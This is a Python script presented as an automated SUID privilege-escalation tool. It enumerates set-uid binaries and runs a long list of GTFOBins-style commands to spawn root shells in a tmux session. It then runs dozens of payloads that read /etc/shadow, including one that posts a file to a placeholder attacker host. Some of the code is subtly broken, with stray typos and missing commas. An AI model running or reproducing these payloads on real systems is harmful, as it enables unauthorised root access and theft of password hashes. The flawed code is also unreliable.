import os
import subprocess
from colorama import Fore, Back, Style


def flsh_print(string):
    print (string, flush = True)


flsh_print(" ")
flsh_print(Style.BRIGHT + """ # Automated suid privilege escalation tool # """)
flsh_print ("""-----------------------------------------------""")
flsh_print (              """  #       https://github.com/ValentaA      # """)
flsh_print ("""-----------------------------------------------""")


#Save suid bits to file 
flsh_print("[+]Saving available suid bits to file 'list.txt'")
basename2 = ("$file")
os.system('''find / -type f -perm -4000 -ls 2>/dev/null | while read -r file; do basename "$file" | cut -d. -f1; done > list.txt''')


#List suid option
flsh_print ("[+]List suid bits?")
get_suid = input("[+]Y/N: ")
if get_suid == "Y" or get_suid == "y":
    flsh_print ("[+]Listing suids")
    get_suid = os.system ("find / -type f -perm -04000 -ls 2>/dev/null")


#Get_root list
get_root = [
    "./agetty -o -p -l /bin/sh -a root tty", "./agetty -o `-p` -l /bin/sh -a root tty", "./ash",
    "./busybox sh", "./cabal exec -- /bin/sh -p", "./cabal exec -- /bin/sh `-p`", "./capsh --gid=0 --uid=0 --",
    "./choom -n 0 -- /bin/sh -p", "./choom -n 0 -- /bin/sh `-p`", "./cpulimit -l 100 -f -- /bin/sh -p",
    "./cpulimit -l 100 -f -- /bin/sh `-p`", "./csh -b", "./dash -p", "./dash `-p`", "./debugfs", "!/bin/sh",
    "./distcc /bin/sh -p", "./distcc /bin/sh `-p`", "./dmsetup create base <<EOF", "0 3534848 linear /dev/loop0 94208",
    "EOF", "./dmsetup ls --exec '/bin/sh -p -s'", "./dmsetup create base <<EOF", "0 3534848 linear /dev/loop0 94208",
    "EOF", "./dmsetup ls --exec '/bin/sh `-p` -s'", "./chroot / /bin/sh `-p`", "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "./elvish", "./env /bin/sh -p", "./env /bin/sh `-p`", "./expect -c 'spawn /bin/sh -p;interact'", "./find . -exec /bin/sh -p \; -quit",
    "./find . -exec /bin/sh `-p` \; -quit", "./fish", "./flock -u / /bin/sh -p", "./flock -u / /bin/sh `-p`", "./gcore $PID",
    "./genie -c '/bin/sh'", "TF=$(mktemp)", "echo '#!/bin/sh -p' > $TF", "./ionice /bin/sh -p", "./ionice /bin/sh `-p`",
    "./julia -e 'run(`/bin/sh -p`)'", "./ksh -p", "./ksh `-p`", "./ld.so /bin/sh -p", "./ld.so /bin/sj `-p`", "./multitime /bin/sh -p",
    "./multitime /bin/sh `-p`", "./ncftp", "!/bin/sh -p", "./ncftp", "!/bin/sh `-p`", "./nice /bin/sh -p", "./nice /bin/sh `-p`",
    './nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"', './nohup /bin/sh -p -c "sh `-p` <$(tty) >$(tty) 2>$(tty)"',
    "./perf stat /bin/sh -p", "./perf stat /bin/sh `-p`", "./pexec /bin/sh -p", "./pexec /bin/sh `-p`", "COMMAND=id",
    "./pidstat -e $COMMAND", "./rc -c '/bin/sh -p'", "./rc -c '/bin/sh `-p`'", "./rlwrap -H /dev/null /bin/sh -p",
    "./rlwrap -H /dev/null /bin/sh `-p`", 'echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc./rtorrent',
    "./run-parts --new-session --regex '^sh$' /bin --arg='-p'", "./sash", "./scanmem", "shell /bin/sh", "./setarch $(arch) /bin/sh -p",
    "./setarch $(arch) /bin/sh `-p`", "./setlock - /bin/sh -p", "./setlock - /bin/sh `-p`", "./softlimit /bin/sh -p",
    "./softlimit /bin/sh `-p`", "./ssh-agent /bin/ -p", "./ssh-keygen -D ./lib.so", "./sshpass /bin/sh -p", "./sshpass /bin/sh `-p`",
    "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p", "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- `-p`",
    "./stdbuf -i0 /bin/sh -p", "./stdbuf -i0 /bin/sh `-p`", "./strace -o /dev/null /bin/sh -p", "./strace -o /dev/null /bin/sh `-p`",
    "./taskset 1 /bin/sh -p", "./taskset 1 /bin/sh `-p`", "./tclsh", "exec /bin/sh -p <@stdin >@stdout 2>@stderr", "./tclsh",
    "exec /bin/sh `-p` <@stdin >@stdout 2>@stderr", "./time /bin/sh -p", "./time /bin/sh `-p`", "./timeout 7d /bin/sh -p",
    "./timeout 7d /bin/sh `-p`", "./unshare -r /bin/sh", "./unzip -K shell.zip", "./sh -p", "./unzip -K shell.zip", "./sh `-p`",
    "./vigr", "./vipw", "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'", "./watch -x sh `-p` -c 'reset; exec sh `-p` 1>&0 2>&0'",
    "TF=$(mktemp)", "chmod +x $TF", "echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF", "./wget --use-askpass=$TF 0",
    "./xargs -a /dev/null sh -p", "./xargs -a /dev/null sh `-p`", "./xdotool exec --sync /bin/sh -p", "./xdotool exec --sync /bin/sh `-p`",
    "./yash", "./zsh"
]


#Keep just suid names
get_root_wth_pth = [item.lstrip("./") for item in get_root]


with open ("list.txt", "r") as listed:
    lsted = listed.read()
 
    
def app_name(command):
    return command.split()[0]
        

#Function to create a new tmux session if it doesn't exist
def create_tmux_session(session_name):
    result = subprocess.run(["tmux", "has-session", "-t", session_name], capture_output=True)
    if result.returncode != 0:
        subprocess.run(["tmux", "new-session", "-d", "-s", session_name])
        return True
    return False


tmux = "aspet_session"
session_created = False


#Search with path added
for shell in get_root_wth_pth:
    flsh_print("[+]Trying to get root shell - CTRL + C if stuck")
    flsh_print("[+]Use commands 'exit' or 'quit' to close the shell")
    for app in lsted:
        if app in app_name(shell):
            if not session_created:
                session_created = create_tmux_session(tmux)
            subprocess.run(["tmux", "send-keys", "-t", tmux, "clear", "C-m"])
            subprocess.run(["tmux", "send-keys", "-t", tmux, shell + " && exit", "C-m"])
            break  # Exit the loop once the condition is met
        else:
            flsh_print("[+]Not found")



#Search without path added
for shel in get_root_wth_pth:
    flsh_print("[+]Trying to get root shell - CTRL + C if stuck")
    flsh_print("[+]Use commands 'exit' or 'quit' to close the shell")
    for app in lsted:
        if app in app_name(shel):
            if not session_created:
                session_created = create_tmux_session(tmux)
            subprocess.run(["tmux", "send-keys", "-t", tmux, "clear", "C-m"])
            subprocess.run(["tmux", "send-keys", "-t", tmux, shel + " && exit", "C-m"]) 
            break  # Exit the loop once the condition is met
        else:
            flsh_print("[+]Not found")


subprocess.run(["tmux", "attach-session", "-t", tmux])


#Clean early created suid list file
os.system("rm list.txt")


flsh_print ("[+]------------------------------")
flsh_print ("[+]Continue with get /etc/shadow?")
option_hash = input("Y/N: ")


#Get_hash list:  
#Change url to attacker machine
get_hash = ["URL=http://attacker.com/", "LFILE=file_to_send", "ab -p $LFILE $URL", "LFILE=/etc/shadow", './alpine -F "$LFILE"',
"TF=$(mktemp -u)", "LFILE=/etc/shadow" './ar r "$TF" "$LFILE"', 'cat "$TF"',
"TF=$(mktemp -d)","LFILE=---------","LDIR=--------", 'echo DATA >"$TF/$LFILE', 'arj a "$TF/a" "$TF/$LFILE"', './arj e "$TF/a" $LDIR',
"LFILE=/etc/shadow", './arp -v -f "$LFILE"', "LFILE=/etc/shadow", "./as @$LFILE"
"LFILE=/etc/shadow",  './ascii-xfr -ns "$LFILE"', "LFILE=/etc/shadow",'./aspell -c "$LFILE"', 
"LFILE=/etc/shadow", 'base32 "$LFILE" | base32 --decode', "LFILE=/etc/shadow", './base64 "$LFILE" | base64 --decode',
"LFILE=/etc/shadow", "basenc --base64 $LFILE | basenc -d --base64", 
"LFILE=/etc/shadow", './basez "$LFILE" | basez --decode', "LFILE=/etc/shadow", "./bc -s $LFILE", "quit", 
"LFILE=/etc/shadow", './bridge -b "$LFILE"', "LFILE=/etc/shadow", './cat "$LFILE"',
"LFILE=/etc/shadow", "./cmp $LFILE /dev/zero -b -l", "LFILE=/etc/shadow", "./column $LFILE", 
"LFILE=/etc/shadow", "comm $LFILE /dev/null 2>/dev/null", 
"LFILE=/etc/shadow", './cp --attributes-only --preserve=all ./cp "$LFILE"',
"LFILE=/etc/shadow", "TF=$(mktemp -d)", 'echo "$LFILE" | ./cpio -R $UID -dp $TF', 'cat "$TF/$LFILE"',
"LFILE=/etc/shadow", "csplit $LFILE 1", "cat xx01", "LFILE=/etc/shadow", "./csvtool trim t $LFILE", 
"LFILE=/etc/shadow", "./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE",
"LFILE=/etc/shadow",'./cut -d "" -f1 "$LFILE"', "LFILE=/etc/shadow", "./date -f $LFILE",
"LFILE=/etc/shadow", './dialog --textbox "$LFILE" 0 0', "LFILE=7etc/shadow", "./diff --line-format=%L /dev/null $LFILE", 
"LFILE=/etc/shadow", "./dig -f $LFILE", "./ed /etc/shadow", ",p", "q",
"LFILE=/etc/shadow", './efax -d "$LFILE"', "LFILE=/etc/shadow", './eqn "$LFILE"', 
"LFILE=/etc/shadow", './espeak -qXf "$LFILE"', "LFILE=/etc/shadow", './expand "$LFILE"',
"LFILE=/etc/shadow", "./file -f $LFILE", "LFILE=/etc/shadow", './fmt -999 "$LFILE"', 
"LFILE=/etc/shadow", './fold -w99999999 "$LFILE"', "LFILE=/etc/shadow", './genisoimage -sort "$LFILE"', 
 "./grep '' $LFILE", "LFILE=/etc/shadow", "./gzip -f $LFILE -t", 
"LFILE=/etc/shadow", './hd "$LFILE"', "LFILE=/etc/shadow", './head -c1G "$LFILE"',
"LFILE=/etc/shadow", './hexdump -C "$LFILE"', "LFILE=/etc/shadow", './highlight --no-doc --failsafe "$LFILE"',
"LFILE=/etc/shadow", './iconv -f 8859_1 -t 8859_1 "$LFILE"', 
"./ispell /etc/shadow", "!/bin/sh -p", "./ispell /etc/shadow", "!/bin/sh `-p`", 
"LFILE=/etc/shadow", "./join -a 2 /dev/null $LFILE", "LFILE=/etc/shadow", './jq -Rr . "$LFILE"', 
"LFILE=/etc/shadow", "./ksshell -i $LFILE", "./less /etc/shadow", "./logsave /dev/null /bin/sh -i -p", 
"./logsave /dev/null /bin/sh -i `-p`", "./more /etc/shadow", "LFILE=/etc/shadow", './mosquitto -c "$LFILE"',
"LFILE=/etc/shadow", "./msgattrib -P $LFILE", "LFILE=/etc/shadow", "./msgcat -P $LFILE",
"LFILE=/etc/shadow", "./msgconv -P $LFILE", "LFILE=/etc/shadow", "./msgmerge -P $LFILE /dev/null", 
"LFILE=/etc/shadow", "./msguniq -P $LFILE", "LFILE=/etc/shadow", "./nasm -@ $LFILE", 
"LFILE=/etc/shadow", './nft -f "$LFILE"', "LFILE=/etc/shadow", "./nm @$LFILE",
"LFILE=/etc/shadow", './od -An -c -w9999 "$LFILE"', "LFILE=/etc/shadow", "paste $LFILE",
"./pg /etc/shadow", "LFILE=/etc/shadow", "pr -T $LFILE", "LFILE=/etc/shadow", './ptx -w 5000 "$LFILE"', 
"LFILE=/etc/shadow", "./readelf -a @$LFILE", "LFILE=/etc/shadow", "./rev $LFILE | rev",
"LFILE=/etc/shadow", './soelim "$LFILE"', "LFILE=/etc/shadow", './sort -m "$LFILE"', 
"LFILE=/etc/shadow", "sqlite3 << EOF", "CREATE TABLE t(line TEXT);", ".import $LFILE t", "SELECT * FROM t;", "EOF", 
"LFILE=/etc/shadow", "./ss -a -F $LFILE", "LFILE=/etc/shadow", "./ssh-keyscan -f $LFILE", 
"LFILE=/etc/shadow", './strings "$LFILE"', "LFILE=/etc/shadow", './tail -c1G "$LFILE"', 
"LFILE=/etc/shadow", "./tbl $LFILE", "LFILE=/etc/shadow", './tic -C "$LFILE', 
"LFILE=/etc/shadow", "./troff $LFILE", "LFILE=/etc/shadow", './ul "$LFILE"',
"LFILE=/etc/shadow", './unexpand -t99999999 "$LFILE"', "LFILE=/etc/shadow", './uniq "$LFILE"',
"LFILE=/etc/shadow", 'uuencode "$LFILE" /dev/stdout | uudecode',
"LFILE=/etc/shadow", './w3m "$LFILE" -dump', "LFILE=/etc/shadow", './wc --files0-from "$LFILE"',
"LFILE=/etc/shadow", './whiptail --textbox --scrolltext "$LFILE" 0 0',
"LFILE=/etc/shadow", "./xmodmap -v $LFILE", "LFILE=/etc/shadow", "./xmore $LFILE",
"LFILE=/etc/shadow", './xxd "$LFILE" | xxd -r', "LFILE=/etc/shadow", './xz -c "$LFILE" | xz -d', 
"LFILE=/etc/shadow", './zsoelim "$LFILE"']


for x in get_hash:
    if option_hash == "y" or option_hash == "Y":
        flsh_print ("[*]Trying to read /etc/shadow - CTRL + C if stuck")
        x = os.system(x)
        

flsh_print ("[+]------------------------------") 
flsh_print ("[+]For more binaries and techniques visit: https://gtfobins.github.io/")  
flsh_print("""----------------------------------------------------------------------""")






